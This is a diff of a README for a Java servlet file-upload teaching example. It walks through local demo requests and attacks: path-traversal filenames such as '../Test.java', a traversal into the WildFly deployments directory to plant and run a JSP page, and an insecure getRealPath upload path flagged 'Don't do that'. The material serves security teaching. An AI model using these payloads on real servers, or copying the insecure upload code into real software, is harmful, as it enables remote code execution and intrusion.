@@ -1,4 +1,8 @@
-How to run the example using Maven?
+Example: Servlet-FileUpload
+-------------------------------------------------------------------------------
+
+
+How to run the example?
 -------------------------------------------------------------------------------
 
 $ mvn wildfly:run
@@ -8,8 +12,181 @@ the Web application.
 
 You can access the Web application from your browser:
 
-http://localhost:8080/Servlet-FileUpload
+URL: http://localhost:8080/Servlet-FileUpload
+	
+	
+Demo: Upload a file
+-------------------------------------------------------------------------------
+Select a file and upload this file into this Web application.
+Have a look on the HTTP request and response to understand what is going on:
 
+HTTP-Request:
+	POST /Servlet-FileUpload/UploadServlet HTTP/1.1
+	Host: localhost:8080
+	User-Agent: Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://localhost:8080/Servlet-FileUpload/
+	Connection: keep-alive
+	Content-Type: multipart/form-data; boundary=---------------------------7293606662123211822944859480
+	Content-Length: 344
+	
+	-----------------------------7293606662123211822944859480
+	Content-Disposition: form-data; name="file"; filename="Test.java"
+	Content-Type: text/x-java
+	
+	public class Test
+	{
+	    public static void main(String... args)
+	    {
+	        int i;
+	
+	        System.out.println(i);
+	    }
+	
+	}
+
+	-----------------------------7293606662123211822944859480--
+		
+		
+HTTP-Response:
+	HTTP/1.1 200 OK
+	Connection: keep-alive
+	X-Powered-By: Undertow/1
+	Server: WildFly/8
+	Content-Type: text/html;charset=ISO-8859-1
+	Date: Sun, 22 Feb 2015 15:55:52 GMT
+	Content-Length: 287
+	
+	<html>
+	<head>
+	<title>Servlet upload</title>
+	</head>
+	<body>
+	Uploaded File:<br>
+	field name    = file<br>
+	file name     = Test.java<br>
+	content type  = text/x-java<br>
+	isInMemory    = true<br>
+	size in bytes = 126<br>
+	File saved to    : /home/student/Downloads/Test.java<br>
+	</body>
+	</html>
+	
+
+Attack: Interception Proxy modifies request parameter "filename"
+-------------------------------------------------------------------------------
+If FileItem.getName() is used to calculate the final file path, we can start
+a path-traversal attack:
+   Intercept the HTTP request and change the request parameter "filename",
+   e.g. filename="../Test.java"
+
+HTTP Request (modified):
+	POST /Servlet-FileUpload/UploadServlet HTTP/1.1
+	Host: localhost:8080
+	User-Agent: Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Referer: http://localhost:8080/Servlet-FileUpload/
+	Connection: keep-alive
+	Content-Type: multipart/form-data; boundary=---------------------------14738018361724325900162734879
+	Content-Length: 349
+	
+	-----------------------------14738018361724325900162734879
+	Content-Disposition: form-data; name="file"; filename="../Test.java"      !!!!!!!!!!
+	Content-Type: text/x-java
+	
+	public class Test
+	{
+	    public static void main(String... args)
+	    {
+	        int i;
+	
+	        System.out.println(i);
+	    }
+	
+	}
+	
+	-----------------------------14738018361724325900162734879--
+
+
+HTTP-Response:
+
+	HTTP/1.1 200 OK
+	Connection: keep-alive
+	X-Powered-By: Undertow/1
+	Server: WildFly/8
+	Content-Type: text/html;charset=ISO-8859-1
+	Date: Sun, 22 Feb 2015 16:00:58 GMT
+	Content-Length: 293
+	
+	<html>
+	<head>
+	<title>Servlet upload</title>
+	</head>
+	<body>
+	Uploaded File:<br>
+	field name    = file<br>
+	file name     = ../Test.java<br>
+	content type  = text/x-java<br>
+	isInMemory    = true<br>
+	size in bytes = 126<br>
+	File saved to    : /home/student/Downloads/../Test.java<br>     !!!!!!!!!!!!!!
+	</body>
+	</html>	
+		
+
+Attack: Inject JSP file	into a Web-application
+-------------------------------------------------------------------------------	
+
+If we set the upload-path within the Web-application's root directory, or we can
+use a path traversal attack to access this directory, we can upload and execute 
+files from the browser:
+
+	public void init()
+	{
+		// Get the file location where it would be stored.
+		filePath = getServletContext().getRealPath("/"); //!!! Don't do that
+	}
+
+In the browser we can upload a JSP like this hack.jsp file:
+
+	<%@ page language="java" contentType="text/html; charset=UTF-8"
+	    pageEncoding="UTF-8"%>
+	<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+	<html>
+	<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>File Upload Attack</title>
+	</head>
+	<body>
+		<h1>This file has been uploaded from a user...</h1>
+	
+		Web-Root: <%=application.getRealPath("/") %><br>
+		
+	<%
+	   // Scriptlet
+	    java.util.Date date = new java.util.Date();
+		
+		out.println( date );
+	    out.println( "<BR>Your machine's address is " );
+	    out.println( request.getRemoteHost());
+	%>
+	</body>
+	</html>
+
+So, we can a execute the JSP be browsing to: 
+	http://localhost:8080/Servlet-FileUpload/hack.jsp	
+
+Using a path traversal attack
+o) Change request parameter to:
+	Content-Disposition: form-data; name="file"; filename="../install/wildfly-8.2.0.Final/standalone/deployments/Servlet-FileUpload.war/hack.jsp"
+	Content-Type: application/octet-stream
+	
+o) Browse to: http://localhost:8080/Servlet-FileUpload/hack.jsp	
+				
 
 
 Apache Commons FileUpload
@@ -81,235 +258,7 @@ into memory, which may come handy with large files.
 
 	boolean isInMemory()
 	Provides a hint as to whether or not the file contents will be read from memory.
-	
-	
-Example: Java File Upload
--------------------------------------------------------------------------------
-	HTTP-Request:
-		POST /Servlet-FileUpload/UploadServlet HTTP/1.1
-		Host: localhost:8080
-		User-Agent: Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0
-		Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-		Accept-Language: en-US,en;q=0.5
-		Accept-Encoding: gzip, deflate
-		Referer: http://localhost:8080/Servlet-FileUpload/
-		Connection: keep-alive
-		Content-Type: multipart/form-data; boundary=---------------------------7293606662123211822944859480
-		Content-Length: 344
-		
-		-----------------------------7293606662123211822944859480
-		Content-Disposition: form-data; name="file"; filename="Test.java"
-		Content-Type: text/x-java
-		
-		public class Test
-		{
-		    public static void main(String... args)
-		    {
-		        int i;
-		
-		        System.out.println(i);
-		    }
-		
-		}
-	
-		-----------------------------7293606662123211822944859480--
-		
-		
-	HTTP-Response:
-		HTTP/1.1 200 OK
-		Connection: keep-alive
-		X-Powered-By: Undertow/1
-		Server: WildFly/8
-		Content-Type: text/html;charset=ISO-8859-1
-		Date: Sun, 22 Feb 2015 15:55:52 GMT
-		Content-Length: 287
-		
-		<html>
-		<head>
-		<title>Servlet upload</title>
-		</head>
-		<body>
-		Uploaded File:<br>
-		field name    = file<br>
-		file name     = Test.java<br>
-		content type  = text/x-java<br>
-		isInMemory    = true<br>
-		size in bytes = 126<br>
-		File saved to    : /home/student/Downloads/Test.java<br>
-		</body>
-		</html>
-	
 
-Attack: Interception Proxy modifies request parameter "filename"
--------------------------------------------------------------------------------
-Wenn FileItem.getName() zur Berechnung des File-Pfades verwendet wird, kann
-eine Path-Traversal Attacke gestartet werden, indem via Interception Proxy
-der HTTP Request Parameter "filename" verändert wird, zB: ../Filename.pdf
-
-HTTP Request (modified):
-	POST /Servlet-FileUpload/UploadServlet HTTP/1.1
-	Host: localhost:8080
-	User-Agent: Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0
-	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-	Accept-Language: en-US,en;q=0.5
-	Accept-Encoding: gzip, deflate
-	Referer: http://localhost:8080/Servlet-FileUpload/
-	Connection: keep-alive
-	Content-Type: multipart/form-data; boundary=---------------------------14738018361724325900162734879
-	Content-Length: 349
-	
-	-----------------------------14738018361724325900162734879
-	Content-Disposition: form-data; name="file"; filename="../Test.java"      !!!!!!!!!!
-	Content-Type: text/x-java
-	
-	public class Test
-	{
-	    public static void main(String... args)
-	    {
-	        int i;
-	
-	        System.out.println(i);
-	    }
-	
-	}
-	
-	-----------------------------14738018361724325900162734879--
-
-
-HTTP-Response:
-
-	HTTP/1.1 200 OK
-	Connection: keep-alive
-	X-Powered-By: Undertow/1
-	Server: WildFly/8
-	Content-Type: text/html;charset=ISO-8859-1
-	Date: Sun, 22 Feb 2015 16:00:58 GMT
-	Content-Length: 293
-	
-	<html>
-	<head>
-	<title>Servlet upload</title>
-	</head>
-	<body>
-	Uploaded File:<br>
-	field name    = file<br>
-	file name     = ../Test.java<br>
-	content type  = text/x-java<br>
-	isInMemory    = true<br>
-	size in bytes = 126<br>
-	File saved to    : /home/student/Downloads/../Test.java<br>     !!!!!!!!!!!!!!
-	</body>
-	</html>	
-	
-	
-Attack: Client modifies file extension, e.g. from .txt to .xml
--------------------------------------------------------------------------------
-
-HTTP-Request:
-	POST /Servlet-FileUpload/UploadServlet HTTP/1.1
-	Host: localhost:8080
-	User-Agent: Mozilla/5.0 (X11; Linux i686; rv:32.0) Gecko/20100101 Firefox/32.0
-	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-	Accept-Language: en-US,en;q=0.5
-	Accept-Encoding: gzip, deflate
-	Referer: http://localhost:8080/Servlet-FileUpload/
-	Connection: keep-alive
-	Content-Type: multipart/form-data; boundary=---------------------------1954756663813752241395570603
-	Content-Length: 340
-	
-	-----------------------------1954756663813752241395570603
-	Content-Disposition: form-data; name="file"; filename="Test.xml"
-	Content-Type: text/xml													!!!!!!!!!!
-	
-	public class Test
-	{
-	    public static void main(String... args)
-	    {
-	        int i;
-	
-	        System.out.println(i);
-	    }
-	
-	}
-	
-	-----------------------------1954756663813752241395570603--
-
-	
-HTTP-Response:
-	HTTP/1.1 200 OK
-	Connection: keep-alive
-	X-Powered-By: Undertow/1
-	Server: WildFly/8
-	Content-Type: text/html;charset=ISO-8859-1
-	Date: Sun, 22 Feb 2015 16:24:29 GMT
-	Content-Length: 282
-	
-	<html>
-	<head>
-	<title>Servlet upload</title>
-	</head>
-	<body>
-	Uploaded File:<br>
-	field name    = file<br>
-	file name     = Test.xml<br>
-	content type  = text/xml<br>
-	isInMemory    = true<br>
-	size in bytes = 126<br>
-	File saved to    : /home/student/Downloads/Test.xml<br>
-	</body>
-	</html>	
-	
-
-Attack: Inject JSP file	into a Web-application
--------------------------------------------------------------------------------	
-
-If we set the upload-path within the Web-application's root directory, or we can
-use a path traversal attack to access this directory, we can upload and execute 
-files from the browser:
-
-	public void init()
-	{
-		// Get the file location where it would be stored.
-		filePath = getServletContext().getRealPath("/"); //!!! Don't do that
-	}
-
-In the browser we can upload a JSP like this hack.jsp file:
-
-	<%@ page language="java" contentType="text/html; charset=UTF-8"
-	    pageEncoding="UTF-8"%>
-	<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
-	<html>
-	<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	<title>File Upload Attack</title>
-	</head>
-	<body>
-		<h1>This file has been uploaded from a user...</h1>
-	
-		Web-Root: <%=application.getRealPath("/") %><br>
-		
-	<%
-	   // Scriptlet
-	    java.util.Date date = new java.util.Date();
-		
-		out.println( date );
-	    out.println( "<BR>Your machine's address is " );
-	    out.println( request.getRemoteHost());
-	%>
-	</body>
-	</html>
-
-So, we can a execute the JSP be browsing to: 
-	http://localhost:8080/Servlet-FileUpload/hack.jsp	
-
-Using a path traversal attack
-o) Change request parameter to:
-	Content-Disposition: form-data; name="file"; filename="../install/wildfly-8.2.0.Final/standalone/deployments/Servlet-FileUpload.war/hack.jsp"
-	Content-Type: application/octet-stream
-	
-o) Browse to: http://localhost:8080/Servlet-FileUpload/hack.jsp	
-		
-		
 	
 Alternatives:
 -------------------------------------------------------------------------------
@@ -318,4 +267,8 @@ Alternatives:
 	
 - Why File Upload Forms are a Major Security Threat
 	http://www.acunetix.com/websitesecurity/upload-forms-threat/
+
+
+
+
 		
